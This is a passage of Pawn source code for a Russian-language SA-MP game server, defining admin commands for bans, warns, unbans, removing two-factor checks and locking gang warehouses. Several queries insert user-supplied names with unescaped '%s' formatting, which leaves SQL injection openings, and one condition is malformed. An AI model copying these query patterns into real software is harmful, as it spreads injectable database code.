	format(YCMDstr, sizeof(YCMDstr), "    Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PlayerInfo[params[0]][pIpReg],PlayerInfo[params[0]][pvIp],ip);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
	new null;
	if(PlayerInfo[params[0]][pDonateRank] == 0) null = 30;
	if(PlayerInfo[params[0]][pDonateRank] == 1) null = 21;
	if(PlayerInfo[params[0]][pDonateRank] == 2) null = 14;
	if(PlayerInfo[params[0]][pDonateRank] == 3) null = 7;
	Kick(params[0]);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('SBAN',  '%s', '%s', '%i', '%i', '%s')", Name(params[0]),Name(playerid),gettime(), mktimes(5,0,0,day1+null,month1,year1),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s тихо забанил %s. Причина: %s", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName], ban_reason);
	return true;
}
CMD:offwarn(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new strlen_params;
	strlen_params = strlen(params);
	if(strlen_params < 1 || strlen_params > 84) return SCM(playerid, -1, " Введите: /offwarn [name] [reason]");
	new warn_name[24], warn_reason[60];
	if(sscanf(params, "s[24]s[60]", warn_name, warn_reason)) return SCM(playerid, -1, " Введите: /offwarn [name] [reason]");
	if(!CanBan(warn_name)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	mysql_format(DATABASE, QUERY, 62, "SELECT * FROM accounts WHERE Name='%e'", warn_name);
	new Cache:result = mysql_query(DATABASE, QUERY);
	if(cache_num_rows())
	{
		new warns = cache_get_field_content_int(0, "pWarns");
		new year1, month1, day1, hour1, minute1, second1;
		getdate(year1, month1, day1);
		gettime(hour1, minute1, second1);
		format(YCMDstr, sizeof(YCMDstr), "OffWarn[заварнил: %s][заварнен: %s][Причина: %s][%i/%i/%i  %i:%i]",Name(playerid),warn_name,warn_reason,day1,month1,year1,hour1, minute1);
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pLeader = '0',pMember = '0',pRank = '0',pJob = '0',OffWarns = '%i',punWarns = '%i',pWarns = '%i' WHERE name = '%s'",gettime()+1218400, mktimes(0, 0, 0, day1+30, month1, year1), warns+1, warn_name);
		mysql_function_query(DATABASE,QUERY,false,"","");
	}
	else SCM(playerid, -1, " Игрок не найден");
	printf("Администратор %s заварнил %s в оффлайн-режиме. Причина: %s", PlayerInfo[playerid][pName], warn_name, warn_reason);
	return cache_delete(result, DATABASE);
}
CMD:offban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new strlen_params;
	strlen_params = strlen(params);
	if(strlen_params < 1 || strlen_params > MAX_PLAYER_NAME+60) return SCM(playerid, -1, " Введите: /offban [name] [reason]");
	new ban_name[24],ban_reason[60];
	if(sscanf(params, "s[24]s[60]",ban_name,ban_reason)) return SCM(playerid, -1, " Введите: /offban [name] [reason]");
	if(!CanBan(ban_name)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	format(YCMDstr, sizeof(YCMDstr), " OffBan[забанил: %s][забанен: %s][Причина: %s][%i/%02i/%02i  %02i:%02i:%02i]",Name(playerid),ban_name,ban_reason,year1,month1,day1,hour1, minute1,second1);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`,`Reason`) VALUES ('OffBan', '%s', '%s', '%i', '%i', '%s')",ban_name,Name(playerid),gettime(), mktimes(5,0,0,30,month1,year1),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s забанил в оффлайн-режиме %s. Причина: %s", PlayerInfo[playerid][pName], ban_name, ban_reason);
	return true;
}
CMD:unban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, COLOR_GRAD1, " Введите: /unban [name]");
	mysql_format(DATABASE, QUERY, 62, "SELECT `Name` FROM `"TABLE_BAN"` WHERE `Name` = '%s'", params[0]);
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(!r)
	{
	    return SCM(playerid, COLOR_GREY, " Аккаунт не найден!");
	}
	mysql_format(DATABASE,QUERY,128, "DELETE FROM `"TABLE_BAN"` WHERE `Name` = '%e'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, sizeof(YCMDstr), " Admin: %s unbaned: %s",Name(playerid),params[0]);
	ABroadCast(COLOR_YELLOW,YCMDstr,1);
	printf("Администратор %s разбанил %s", PlayerInfo[playerid][pName], params[0]);
	return true;
}
CMD:offuninvite(playerid, params[])
{
	if(PlayerInfo[playerid][pLeader] > 0)
	{
		new params_name[24];
		if(sscanf(params, "s[24]", params_name)) return SCM(playerid, -1, " Введите: /offUninvite [Имя]");
		mysql_format(DATABASE, QUERY, 62, "SELECT * FROM "TABLE_ACCOUNTS" WHERE Name='%e' and pMember = '%d' and pLeader = '0'", params_name,PlayerInfo[playerid][pMember]);
		mysql_query(DATABASE, QUERY);
		if(cache_num_rows())
		{
			SendMes(playerid,COLOR_BLUE," Вы выгнали %s из организации",params_name);
			format(YCMDstr, sizeof(YCMDstr), " Лидер: %s offUninvite: %s",Name(playerid),params[0]);
			ABroadCast(COLOR_YELLOW,YCMDstr,5);
			printf(YCMDstr);
			mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pText = '9', pLeader = '0',pMember = '0',pRank = '0',pJobHeal = '0' WHERE name = '%s'",params_name);
			mysql_function_query(DATABASE,QUERY,false,"","");
		}
		else SCM(playerid, -1, " Ошибка: Игрок не в вашей фракции");
	}
	else if(PlayerInfo[playerid][pAdmin] >= 5)
	{
	    if(sscanf(params, "s[128]",params[0])) return SCM(playerid, -1, " Введите: /offUninvite [name]");
		new year, month, day, hour, minute, second;
		getdate(year, month, day);
		gettime(hour, minute, second);
		mysql_format(DATABASE,QUERY, 256, "UPDATE accounts SET pLeader = '0',pMember = '0',pRank = '0',pText = '9',pJobHeal = '0' WHERE name = '%s'",params[0]);
		mysql_function_query(DATABASE,QUERY,false,"","");
		format(YCMDstr, sizeof(YCMDstr), " Admin: %s offUninvite: %s",Name(playerid),params[0]);
		ABroadCast(COLOR_YELLOW,YCMDstr,5);
		printf(YCMDstr);
	}
	return true;
}
CMD:offip(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, COLOR_GRAD1, " Введите: /offip [name]");
	mysql_format(DATABASE,QUERY,128, "UPDATE accounts SET pCheckIp = '0', pGoogleIP ='0' WHERE name = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s снял IP и Google Authenticator проверку с %s",Name(playerid),params[0]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	return true;
}
CMD:offgoogleauth(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid, COLOR_GRAD1, " Введите: /offGoogleAuth [name]");
	mysql_format(DATABASE,QUERY,128, "UPDATE accounts SET pGoogleIP = '0' WHERE name = '%s'",params[0]);
	mysql_function_query(DATABASE,QUERY,false,"","");
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s снял Google Authenticator проверку с %s",Name(playerid),params[0]);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	if(GetPlayerID(params[0]) != INVALID_PLAYER_ID)
	PlayerInfo[GetPlayerID(params[0])][pGoogleIP] = 0;
	return true;
}
CMD:realodbans(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 9 || dostup[playerid] == 0) return true;
	SendRconCommand("reloadbans");
	SCM(playerid, -1, " Бан-лист перезагружен.");
	return true;
}
CMD:warelock(playerid)
{
	if(!PlayerInfo[playerid][pLogin]) return true;
    if(Flood[playerid] > 0)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+2);
  		if(GetPVarInt(playerid,"Flood") >= 5) kick(playerid);
  		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	if(!IsABiker(playerid) && !IsAMafia(playerid) && !IsAGang(playerid)) return SCM(playerid,COLOR_GREY," Доступно только криминалу");
	switch(PlayerInfo[playerid][pMember])
	{
		case 12:
		{
		    if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareBallasLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareBallasLock = true;
			}
			else if(wareBallasLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareBallasLock = false;
			}
		}
		case 13:
		{
  			if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareVagosLock == false)
			{
				SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareVagosLock = true;
			}
			else if(wareVagosLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareVagosLock = false;
			}
		}
		case 15:
		{
  			if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareGrooveLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareGrooveLock = true;
			}
			else if(wareGrooveLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareGrooveLock = false;
			}
		}
		case 17:
		{
  			if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareAztecLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareAztecLock = true;
			}
			else if(wareAztecLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareAztecLock = false;
			}
		}
		case 18:
		{
  			if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareRifaLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareRifaLock = true;
			}
			else if(wareRifaLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareRifaLock = false;
			}
		}
		case 5://LCN
		{
  			if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareLcnLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareLcnLock = true;
			}
			else if(wareLcnLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareLcnLock = false;
			}
		}
		case 6://Yakuza
		{
  			if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareYakuzaLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareYakuzaLock = true;
			}
			else if(wareYakuzaLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareYakuzaLock = false;
			}
		}
		case 14://RM
		{
  			if(PlayerInfo[playerid][pRank] < 8) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareRmLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareRmLock = true;
			}
			else if(wareRmLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareRmLock = false;
			}
		}
		case 24://Hell's Angels MC
		{
  			if(PlayerInfo[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareHAMLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareHAMLock = true;
			}
			else if(wareHAMLock == true)
			{
				SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareHAMLock = false;
			}
		}
		case 26://Warlocks MC
		{
  			if(PlayerInfo[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(wareWCMLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				wareWCMLock = true;
			}
			else if(wareWCMLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				wareWCMLock = false;
			}
		}
		case 29://Pagans MC
		{
  			if(PlayerInfo[playerid][pRank] < 7) return SCM(playerid, COLOR_GREY, " Ранг должен быть выше");
			if(warePMCLock == false)
			{
			    SCM(playerid, 0xff0606aa, " Склад закрыт");
				format(string, sizeof(string), " %s закрыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0xff0606aa,string);
				warePMCLock = true;
			}
			else if(warePMCLock == true)
			{
			    SCM(playerid, 0x57ff4fff, " Склад открыт");
				format(string, sizeof(string), " %s открыл склад с оружием", Name(playerid));
				SendFamilyMessage(PlayerInfo[playerid][pMember],0x57ff4fff,string);
				warePMCLock = false;
			}
		}
	}
	Flood[playerid] = 2;
	SetPVarInt(playerid,"Flood",0);
	return true;
}
stock CanBan(giveplayername[])
{
    mysql_format(DATABASE, QUERY, 100, "SELECT `level` FROM `"TABLE_ADMIN"` WHERE `Name` = '%s'", giveplayername);
	mysql_query(DATABASE, QUERY);
	new r = cache_num_rows();
	if(r)//cache_num_rows(r))
	{
		new levels = cache_get_field_content_int(0,"level");
		if(levels > 6)
		{
		    return false;
		}
	}
	return true;
}
CMD:warn(playerid, params[])
{
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "us[128]",params[0],params[1])) return SCM(playerid, -1, " Введите: /warn [id/ник] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(PlayerInfo[params[0]][pAdmin] > 6)  return SCM(playerid, COLOR_GREY, " Ошибка. Администратора с данным уровнем заварнить невозможно!");
	new year, month,day;
	getdate(year, month, day);
	if(PlayerInfo[params[0]][pAdmin] >= 7 && PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PlayerInfo[params[0]][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
	new null;
	if(PlayerInfo[params[0]][pDonateRank] == 0) null = 30;
	if(PlayerInfo[params[0]][pDonateRank] == 1) null = 21;
	if(PlayerInfo[params[0]][pDonateRank] == 2) null = 14;
	if(PlayerInfo[params[0]][pDonateRank] == 3) null = 7;
	PlayerInfo[params[0]][pWarns] += 1;
	if(PlayerInfo[params[0]][pWarns] >= 3)
	{
		new ip[32];
		format(YCMDstr, sizeof(YCMDstr), " Администратор: %s забанил %s [3 предупреждения]. Причина: %s",Name(playerid),Name(params[0]),params[1]);
		SendClientMessageToAll(COLOR_LIGHTRED, YCMDstr);
		GetPlayerIp(params[0],ip,sizeof(ip));
		format(YCMDstr, sizeof(YCMDstr), "    Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PlayerInfo[params[0]][pIpReg],PlayerInfo[params[0]][pvIp],ip);
		ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
		PlayerInfo[params[0]][pMember] = 0;
		PlayerInfo[params[0]][pLeader] = 0;
		PlayerInfo[params[0]][pJob] = 0;
		mysql_format(DATABASE,QUERY, 256, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`) VALUES ('3 WARNS', '%s', '%s', '%i', '%i')",Name(params[0]),Name(playerid),gettime(),mktimes(5,0,0,day+null,month,year));
		mysql_function_query(DATABASE,QUERY,false,"","");
		Kick(params[0]);
		return true;
	}
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s выдал warn %s. Причина: %s",Name(playerid),Name(params[0]),params[1]);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	PlayerInfo[params[0]][pMember] = 0;
	PlayerInfo[params[0]][pLeader] = 0;
	PlayerInfo[params[0]][pJob] = 0;
	if(PlayerInfo[params[0]][pDonateRank] == 0) PlayerInfo[params[0]][OffWarns] = gettime()+1218400;
	if(PlayerInfo[params[0]][pDonateRank] == 1) PlayerInfo[params[0]][OffWarns] = gettime()+900000;
	if(PlayerInfo[params[0]][pDonateRank] == 2) PlayerInfo[params[0]][OffWarns] = gettime()+550000;
	if(PlayerInfo[params[0]][pDonateRank] == 3) PlayerInfo[params[0]][OffWarns] = gettime()+280000;
	PlayerInfo[params[0]][punWarns] = mktimes(0,0,0,day+null,month,year);
	Kick(params[0]);
	printf("Администратор %s заварнил %s. Причина: %s", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName], params[1]);
	return true;
}
CMD:unwarn(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /unwarn [id]");
	if(!IsPlayerConnected(params[0])) return true;
	if(PlayerInfo[params[0]][pWarns] <= 0) {SCM(playerid, COLOR_RED, "Варнов нет"); return true;}
	PlayerInfo[params[0]][pWarns] = 0;
	PlayerInfo[params[0]][punWarns] = 0;
	format(YCMDstr, sizeof(YCMDstr), " Admin: %s unwarned: %s",Name(playerid),Name(params[0]));
	ABroadCast(0xFFFF00AA,YCMDstr,1);
	printf("Администратор %s разварнил %s", PlayerInfo[playerid][pName], params[0]);
	return true;
}
CMD:ban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	new ban_reason[60];
	if(sscanf(params, "u[128]s[60]",params[0],ban_reason)) return SCM(playerid, -1, " Введите: /ban [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
	//if(PlayerInfo[params[0]][pAdmin] > 6)  return SCM(playerid, COLOR_GREY, " Ошибка. Администратора с данным уровнем забанить невозможно!");
	//mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(params[0]));
	//mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",77,0,Name(params[0]));
	new ip[15];
	new year, month,day;
	new null = 30;
	getdate(year, month, day);
	if(PlayerInfo[params[0]][pAdmin] >= 7 && PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PlayerInfo[params[0]][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] < 7 && PlayerInfo[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('AUTOBAN','%s', '%s', '%i', '%i', 'snyat')",Name(playerid),Name(playerid),gettime(), mktimes(5,0,0,day+null,month,2038));
		mysql_function_query(DATABASE,QUERY,false,"","");
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s забанил %s. Причина: %s ",Name(playerid),Name(params[0]),ban_reason);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	GetPlayerIp(params[0],ip,sizeof(ip));
	format(YCMDstr, sizeof(YCMDstr), "     Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PlayerInfo[params[0]][pIpReg],PlayerInfo[params[0]][pvIp],ip);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('BAN','%s', '%s', '%i', '%i', '%s')",Name(params[0]),Name(playerid),gettime(), mktimes(5,0,0,day+null,month,year),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	Kick(params[0]);
	printf("Администратор %s забанил %s. Причина: %s", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName], ban_reason);
	return true;
}
CMD:ttime(playerid, params[])
{
	new year, month,day;
	getdate(year, month, day);
	SendMes(playerid,-1," Год: %i, Месяц: %i, День: %i",year, month, day);
}
stock mktimes(uhour,uminute,usecond,uday,umonth,uyear)
{
	new timestamp2;
	timestamp2 = usecond + (uminute * 60) + (uhour * 3600);
	new days_of_month[12] = { 31,28,31,30,31,30,31,31,30,31,30,31 };
	if ( ((uyear % 4 == 0) && (uyear % 100 != 0)) || (uyear % 400 == 0) )
	{
		days_of_month[1] = 29;
	}
	else
	{
		days_of_month[1] = 28;
	}
	new days_this_year = 0;
	days_this_year = --uday;
	if(umonth > 1)
	{
		for(new i=0; i<umonth-1;i++)
		{
			days_this_year += days_of_month[i];
		}
	}
	timestamp2 += days_this_year * 86400;
	for(new j=1970;j<uyear;j++)
	{
		timestamp2 += 31536000;
		if ( ((j % 4 == 0) && (j % 100 != 0)) || (j % 400 == 0) ) timestamp2 += 86400;
	}
	return timestamp2;
}
CMD:booston(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /booston [days]");
	new year, month,day;
	getdate(year, month, day);
	new null = params[0];
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `boost` (`Text`, `boosttime`) VALUES ('BoostTime', '%i')",mktimes(4,58,0,day+null,month,year));
	mysql_function_query(DATABASE,QUERY,false,"","");
	booston = 1;
	for(new i = 1; i <= ALLKVARTIRI; i++) updatekvar(i);
	printf("Администратор %s включил бонусы на %i дней",Name(playerid), params[0]);
	return SCM(playerid,-1," Бонусы включены");
}
CMD:boostoff(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	mysql_format(DATABASE,QUERY,128, "DELETE FROM `boost` WHERE `Text` = 'BoostTime'");
	mysql_function_query(DATABASE,QUERY,false,"","");
	booston = 0;
	for(new i = 1; i <= ALLKVARTIRI; i++) updatekvar(i);
	printf("Администратор %s отключил бонусы",Name(playerid));
	return SCM(playerid,-1," Бонусы отключены");
}
CMD:iban(playerid, params[])
{
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new ban_reason[60];
	if(sscanf(params, "u[128]s[60]",params[0],ban_reason)) return SCM(playerid, -1, " Введите: /iban [id/ник] [причина]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн / не залогинен");
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
	new ip[15];
	GetPlayerIp(params[0],ip,15);
	new year, month,day;
	getdate(year, month, day);
	if(PlayerInfo[params[0]][pAdmin] >= 7 && PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PlayerInfo[params[0]][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] < 7 <= 6 && PlayerInfo[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('AUTOIBAN','%s', '%s', '%i', '%i', 'snyat')",Name(playerid),Name(playerid),gettime(), mktimes(5,0,0,day,month,2038));
		mysql_function_query(DATABASE,QUERY,false,"","");
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s забанил %s. Причина: %s ",Name(playerid),Name(params[0]),ban_reason);
	SendClientMessageToAll(COLOR_LIGHTRED,YCMDstr);
	GetPlayerIp(params[0],ip,sizeof(ip));
	format(YCMDstr, sizeof(YCMDstr), "    Nik [%s]   R-IP [%s]   L-IP [%s]   IP [%s]",Name(params[0]),PlayerInfo[params[0]][pIpReg],PlayerInfo[params[0]][pvIp],ip);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,2);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('IBAN', '%s', '%s', '%i', '%i', '%s')",Name(params[0]),Name(playerid),gettime(), mktimes(5,0,0,day,month,2038),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	Kick(params[0]);
	printf("Администратор %s забанил навсегда %s. Причина: %s", PlayerInfo[playerid][pName], PlayerInfo[params[0]][pName], ban_reason);
	return true;
}
CMD:freeze(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return	SCM(playerid, -1, " Введите: /freeze [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
